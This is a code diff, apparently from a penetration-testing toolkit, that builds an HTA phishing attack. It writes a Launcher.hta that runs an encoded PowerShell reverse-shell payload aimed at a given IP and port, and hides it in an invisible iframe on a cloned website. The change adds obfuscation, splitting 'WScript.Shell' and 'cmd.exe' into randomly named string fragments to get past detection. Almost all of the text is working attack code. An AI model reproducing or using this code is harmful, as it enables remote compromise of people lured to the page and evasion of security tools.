@@ -33,13 +33,39 @@ def gen_hta_cool_stuff():
         "Generating powershell injection code and x86 downgrade attack...")
     ps = generate_powershell_alphanumeric_payload(
         selection, ipaddr, port, "x86")
-    command = (powershell_encodedcommand() + ps)
+    command = (powershell_encodedcommand(ps))
+
     # hta code here
     print_status("Embedding HTA attack vector and PowerShell injection...")
+
     # grab cloned website
     url = fetch_template()
-    main1 = ("""<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command))
-    main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
+
+    command = command.replace("'", "\\'")
+
+    # generate random variable names for vba
+    hta_rand = generate_random_string(10, 30)
+
+    # split up so we arent calling shell command for cmd.exe
+    shell_split1 = generate_random_string(10, 30)
+    shell_split2 = generate_random_string(10, 30)
+    shell_split3 = generate_random_string(10, 30)
+    shell_split4 = generate_random_string(10, 30)
+    shell_split5 = generate_random_string(10, 30)
+
+    cmd_split1 = generate_random_string(10, 30)
+    cmd_split2 = generate_random_string(10, 30)
+    cmd_split3 = generate_random_string(10, 30)
+    cmd_split4 = generate_random_string(10, 30)
+    
+    main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, shell_split5))
+    main2 = ("""{0} = "cm";\n{1} = "d.e";\n{2} = "xe";\n{3} = ({0} + {1} + {2});\n{4}.run('%windir%\\\\System32\\\\""".format(cmd_split1,cmd_split2,cmd_split3,cmd_split4,hta_rand))
+    main3 = ("""' + {0} + """.format(cmd_split4))
+    main4 = ("""' /c {0}', 0);window.close();\n</script>""".format(command))
+    html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
+
+    #main1 = ("""<script>\na=new ActiveXObject("WScript.Shell");\na.run('%%windir%%\\\\System32\\\\cmd.exe /c %s', 0);window.close();\n</script>""" % (command))
+    #main2 = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\n<script type="text/javascript">setTimeout(function(){window.location.href="%s";}, 15000);</script>""" % url)
 
     # metasploit answer file here
     filewrite = open(setdir + "/meta_config", "w")
@@ -48,10 +74,10 @@ def gen_hta_cool_stuff():
 
     #  write out main1 and main2
     filewrite = open(setdir + "/hta_index", "w")
-    filewrite.write(main2)
+    filewrite.write(html_code)
     filewrite.close()
 
     # write out launcher.hta
     filewrite = open(setdir + "/Launcher.hta", "w")
-    filewrite.write(main1)
+    filewrite.write(main1 + main2 + main3 + main4)
     filewrite.close()
